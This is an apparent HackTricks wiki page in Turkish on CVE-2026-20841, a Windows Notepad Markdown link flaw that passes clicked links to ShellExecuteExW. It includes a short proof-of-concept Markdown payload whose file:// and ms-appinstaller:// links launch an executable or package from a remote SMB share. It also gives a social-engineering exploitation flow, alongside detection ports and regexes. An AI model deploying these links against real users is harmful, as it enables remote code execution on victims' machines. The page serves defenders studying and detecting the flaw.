# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Modern Windows uygulamaları Markdown/HTML render ederken genellikle kullanıcı tarafından sağlanan linkleri tıklanabilir öğelere dönüştürür ve bunları `ShellExecuteExW`'ye verir. Şema beyazlistesi sıkı tutulmazsa, kayıtlı herhangi bir protocol handler (ör. `file:`, `ms-appinstaller:`) tetiklenebilir ve mevcut kullanıcı bağlamında kod yürütülmesine yol açabilir.

## ShellExecuteExW surface in Windows Notepad Markdown mode
- Notepad Markdown modunu **yalnızca `.md` uzantıları için** `sub_1400ED5D0()` içindeki sabit bir string karşılaştırmasıyla seçer.
- Desteklenen Markdown linkleri:
- Standard: `[text](target)`
- Autolink: `<target>` (render edilince `[target](target)` olur), bu yüzden her iki sözdizimi de payloads ve tespitler açısından önemlidir.
- Link tıklamaları `sub_140170F60()` içinde işlenir; bu fonksiyon zayıf filtreleme yapar ve sonra `ShellExecuteExW`'yi çağırır.
- `ShellExecuteExW` yalnızca HTTP(S) ile sınırlı olmaksızın **yapılandırılmış herhangi bir protocol handler**'a yönlendirir.

### Payload ile ilgili hususlar
- Linkteki herhangi bir `\\` dizisi `ShellExecuteExW` çağrılmadan önce **`\` olarak normalize edilir**, bu durum UNC/path oluşturma ve tespiti etkiler.
- `.md` dosyaları varsayılan olarak Notepad ile **ilişkilendirilmemiştir**; hedef yine dosyayı Notepad'te açıp linke tıklamalıdır, ancak bir kez render edildikten sonra link tıklanabilir hale gelir.
- Tehlikeli örnek şemalar:
- `file://` yerel/UNC payload başlatmak için.
- `ms-appinstaller://` App Installer akışlarını tetiklemek için. Yerel olarak kayıtlı diğer şemalar da kötüye kullanılabilir.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### İstismar akışı
1. Notepad'in bunu Markdown olarak görüntülemesi için bir **`.md` dosyası** oluşturun.
2. Tehlikeli bir URI şeması kullanarak (`file:`, `ms-appinstaller:`, veya yüklü herhangi bir işleyici) bir bağlantı gömün.
3. Dosyayı (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB veya benzeri) iletin ve kullanıcıyı bunu Notepad'te açmaya ikna edin.
4. Tıklama ile **normalleştirilmiş bağlantı** `ShellExecuteExW`'ye iletilir ve ilgili protokol işleyicisi referans verilen içeriği kullanıcının bağlamında çalıştırır.

## Tespit fikirleri
- Belgeleri yaygın olarak taşıyan portlar/protokoller üzerinden `.md` dosyası transferlerini izleyin: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown bağlantılarını (standart ve autolink) ayrıştırın ve **büyük/küçük harfe duyarsız** `file:` veya `ms-appinstaller:` arayın.
- Uzak kaynak erişimini yakalamak için vendor tarafından önerilen regex'ler:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Yamanın davranışı bildirildiğine göre **allowlists local files and HTTP(S)**; `ShellExecuteExW`'ye ulaşan diğer her şey şüphelidir. Saldırı yüzeyi sisteme göre değiştiği için tespitleri gerektiğinde diğer yüklü protokol işleyicilerine genişletin.

## Referanslar
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
